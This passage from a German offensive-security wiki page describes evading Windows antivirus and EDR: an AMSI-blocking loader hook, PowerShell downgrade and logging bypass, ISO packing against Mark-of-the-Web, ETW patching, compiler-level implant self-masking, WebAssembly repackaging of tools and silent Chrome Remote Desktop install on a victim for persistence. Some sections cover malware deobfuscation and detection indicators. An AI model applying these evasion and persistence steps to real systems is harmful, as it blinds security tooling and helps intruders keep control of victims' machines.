            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notizen
- Funktioniert mit PowerShell, WScript/CScript und benutzerdefinierten Loaders (alle, die andernfalls AMSI laden würden).
- Kombiniere dies mit dem Zuführen von Scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Befehlszeilen-Artefakte zu vermeiden.
- Wurde bei Loaders beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Scripts zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Scripts zum Umgehen von AMSI, die Signaturen durch zufällig generierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden und zufällige Groß- und Kleinschreibung auf PowerShell-Schlüsselwörter anwenden, um Signaturen zu vermeiden.

**Erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Anweisungen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell-Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne dass sie von AMSI gescannt werden. Das geht so:

```bash
powershell.exe -version 2
```

## PS-Protokollierung

Die PowerShell-Protokollierung ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um die PowerShell-Protokollierung zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Dazu kannst du beispielsweise ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Bei PowerShell Version 2 wird AMSI nicht geladen, sodass du Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Das geht so: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der Ansatz, den `powerpick` von Cobalt Strike verwendet). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Bei mehreren Obfuscation-Techniken werden Daten verschlüsselt. Dadurch steigt die Entropie der Binärdatei, was es AVs und EDRs erleichtert, sie zu erkennen. Sei dabei vorsichtig und wende Verschlüsselung eventuell nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating von mit ConfuserEx geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Ablauf **stellt zuverlässig ein nahezu ursprüngliches IL wieder her**, das anschließend in Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenrumpf* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme geändert, sodass jede Modifikation zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen unpacker nützlich sein können.

2.  Symbol-/Kontrollfluss-Wiederherstellung – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – wählt das ConfuserEx-2-Profil aus
     • de4dot macht das control-flow flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch schlanke Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) angezeigt werden.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um den *echten* Payload zu finden. Oft speichert die Malware ihn als TLV-kodiertes Byte-Array, das in `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne** dass das bösartige Sample ausgeführt werden muss – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu priorisieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz die Softwaresicherheit erhöht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie sich mit der Sprache `C++11/14` zur Compile-Zeit obfuszierter Code generieren lässt, ohne externe Tools zu verwenden oder den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphe Codes für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Anweisungen in ROP-Chains umgewandelt werden, wodurch unsere natürliche Vorstellung eines normalen Kontrollflusses untergraben wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL-Dateien in shellcode umwandeln und anschließend laden.

### LLVM-compilerunterstütztes Self-Masking pro Funktion

Anstatt ein ganzes Implantat nur während des Schlafs zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen XOR-maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode ein und gibt einen gemeinsamen Masking-Handler in `.text` aus; Signaturen auf Quellcodeebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Kontrollfluss-Transformation im Backend

Dies gehört nach der Instruction Selection und Optimierung, da die Transformation **jeden ausgegebenen Return** abdecken und das exakte x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, damit der letzte Pfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Behalte alle vom Compiler erzeugten Stack-/Frame-Aufräumarbeiten vor jedem Return bei; leite nur die Return-Anweisung selbst um.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die von den Ausgabestufen gemeinsam verwendet werden, ermöglichen es einem Prolog-Branch, auf seinen späteren Epilog zu zielen; für ein manuell ausgegebenes Near-`je` schreibe `0F 84`, gefolgt vom vier Byte langen MC-Ausdruck `target - address_after_je`. Calls und Jumps zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt auf diesem Pfad fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt einen XOR-Schlüssel und 16-Byte-Datensätze in `.funcmeta` ab, die einen vom Loader relocierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler auf ein QWORD bei Datensatz-Offset `+8` zu, wodurch die Länge und ihr Padding gelesen werden, und rückt die Datensätze um `0x10` vor. PE-Abschnittsnamen sind nur acht Byte lang, daher sieht die Laufzeitsuche `.funcmet`. Ein externer Patcher fügt einen ausführbaren `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um; der PIC-Stub ermittelt die Image Base über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Die Initialisierung setzt einen Sentinel in `gs:[0xE8]` und ruft jede Metadatenfunktion auf. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Body. Der Epilog verwendet dann `call handler`; nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, ist die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion, sodass `end - start` in ihren Metadatensatz geschrieben werden kann. Der Stub löscht den Sentinel und springt zu `ImageBase + original_entry_point_RVA`, nachdem alle Bodies maskiert wurden.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Call ruft der Prolog denselben symmetrischen Handler auf, um den Body zu decodieren. Der letzte Pfad fällt in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`, sodass nach dem erneuten Maskieren das `ret` des Handlers die Rücksprungadresse des ursprünglichen Callers verwendet und das Funktionsergebnis in `RAX` erhalten bleibt.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Datensatz, überspringt den festgelegten sichtbaren Prolog (in diesem Build `0x46` Byte), setzt den restlichen Bereich auf `PAGE_EXECUTE_READWRITE`, XORt ihn Byte für Byte mit dem niederwertigen Schlüsselbyte und setzt ihn anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife decodiert also beim Eintritt und encodiert bei jedem normalen Exit.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point in einem ausführbaren `.stub` und ein Abschnitt `.funcmet` mit einem Schlüssel sowie relocierten `.text`-Zeigern;
- PEB-, Importtabellen- und Abschnittstabellen-Parsing vor dem CRT, gefolgt von Calls über jeden Metadatenzeiger;
- identische PIC-Prologe mit `call`/`pop` und zahlreiche Return-Sites, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen in ausführbare, vom Image unterstützte Pages.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen Klartext-Body, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion dumpen. Das ein Byte große XOR, die lesbaren Metadaten und die feste Grenze von `0x46` erleichtern außerdem die Offline-Wiederherstellung.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, die modifizierten Code-Pages jedoch prozessweit. Gleichzeitiger oder rekursiver Eintritt kann daher Anweisungen erneut umschalten, während eine andere Invocation sie ausführt; auch Exceptions und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den tatsächlich über `lpflOldProtect` zurückgegebenen Schutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf x64-Stack-Alignment prüfen und nach dem Überschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Caller für die Kohärenz des Instruction Cache verantwortlich ist, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht hast du diesen Bildschirm schon einmal gesehen, wenn du ausführbare Dateien aus dem Internet herunterlädst und ausführst.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und dadurch den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf „Weitere Informationen“ → „Trotzdem ausführen“ klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier-ADS einer aus dem Internet heruntergeladenen Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads den Mark of The Web erhalten, besteht darin, sie in einem Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainern verpackt, um den Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ETW jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie sich AMSI deaktivieren (umgehen) lässt, kann auch die Funktion **`EtwEventWrite`** des User-Space-Prozesses so geändert werden, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Arbeitsspeicher so gepatcht, dass sie sofort zurückkehrt und damit die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binärdateien im Arbeitsspeicher zu laden ist schon seit geraumer Zeit bekannt und nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Arbeitsspeicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Arbeitsspeicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, ausgeführt und der neue Prozess nach Abschluss beendet. Diese Methode hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass bei Problemen mit unseren Post-Exploitation-Aktionen oder falls diese entdeckt werden, die **Überlebenschance unseres Implants deutlich größer ist**. Der Nachteil ist, dass die **Wahrscheinlichkeit größer ist**, von **verhaltensbasierten Erkennungen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der von AV gescannt werden könnte. Der Nachteil ist, dass bei einem Fehler während der Ausführung deiner Payload die **Wahrscheinlichkeit deutlich größer ist**, deinen **Beacon zu verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den zugehörigen InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Normale `execute-assembly`-Techniken behalten erkennbares MSIL bei und initialisieren letztlich eine CLR. **WasmForge** ändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR des Ziels noch einen JIT oder den `dotnet`-Host. Daher verlieren Regeln, die sich ausschließlich auf verwaltete Assembly-Namen, das Laden der CLR, AMSI oder .NET ETW stützen, ihre direkte Sichtbarkeit. Dies ist eine Umgehungs- und Verpackungstechnik, kein Umgehen einer Privilegiengrenze – der Gast behält die Berechtigungen und das beobachtbare OS-Verhalten des ursprünglichen Tools bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Prozess verwendet die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, das WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build mit einem einzigen Befehl übernimmt Migration, Kompatibilitätspatches, WASM-Kompilierung, PE-Erstellung und Signierung.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Bei der Fehlersuche oder Überprüfung des generierten Codes lässt sich der Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` aufteilen. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Component-Kodierung zu vermeiden und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging von wasm32-C# zu x64-Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI bietet Windows-orientierte BCL-Funktionen nicht oder nur in veränderter Form, und ein wasm32-Gast reserviert normalerweise Vier-Byte-Zeigerslots, während x64-APIs Acht-Byte-Zeiger zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Ebenen:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und Ähnliches an `Wf*`-Helper um.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Mappings, sodass `[DllImport]`-Aufrufe an gelinkte C-Bridge-Symbole gebunden werden, anstatt die angegebene DLL dynamisch im Gast zu laden.
3. Hostgebundene Zeiger verwenden `ulong` in C# und `uint64_t` in C. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; eine `out8_mask` kennzeichnet echte Acht-Byte-Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Nicht gekennzeichnete Ausgaben im wasm32-Format werden durch Snapshot-/Restore-Schutz gesichert, damit ein x64-Schreibvorgang die benachbarten vier Bytes nicht beschädigt.
4. Dedizierte Host-Bridges übernehmen Vorgänge, die nicht in die generische Syscall-Dispatch-Logik passen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Datenverkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Host-Adressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge Acht-Byte-Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übernimmt die Zeigerübersetzung und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Ansätze zur Erkennung

Reflection-lastiger Code, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin Patches für einzelne Tools erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können außerdem No-op-Stubs aufrufen; unterstützte Tools verwenden daher protokollspezifische Host-Shims. Überprüfe jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Die Technik verlagert Telemetrie, statt den payload unsichtbar zu machen. Die Erkennung kann sich auf ein PE konzentrieren, das ein WASM-Modul enthält oder materialisiert, auf Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Speicherzuweisungen und Kopiervorgänge zwischen Host und Guest, generische direkte Win32-Aufrufe, Anomalien bei Signaturen und PE-Ressourcen sowie die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Fehlen von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, schädlichen Code mit anderen Sprachen auszuführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Wenn du den Zugriff auf die Interpreter-Binärdateien und die Umgebung auf der SMB-Freigabe erlaubst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Laut dem Repo scannt Defender die Skripte weiterhin, doch durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analysen

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliert das Access-Token eines Sicherheitsprodukts wie EDR oder AV. Wird die Berechtigung des Tokens reduziert, kann der Prozess weiterlaufen, ohne privilegierte Prüf- oder Abhilfemaßnahmen ausführen zu können.

Um dies zu verhindern, könnte Windows **externen Prozessen verbieten**, Handles für die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend zur Übernahme und Aufrechterhaltung der Persistenz verwenden:<sup>[[35]](#references)</sup>
1. Lade das Programm von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm auf dem Opfer-PC im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Weiter“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf die Schaltfläche „Autorisieren“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).
 

## Fortgeschrittene Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehung ist ein sehr komplexes Thema. Manchmal musst du zahlreiche unterschiedliche Telemetriequellen in einem einzigen System berücksichtigen. In ausgereiften Umgebungen ist es daher praktisch unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Umgehungstechniken zu bekommen.


{{#ref}}
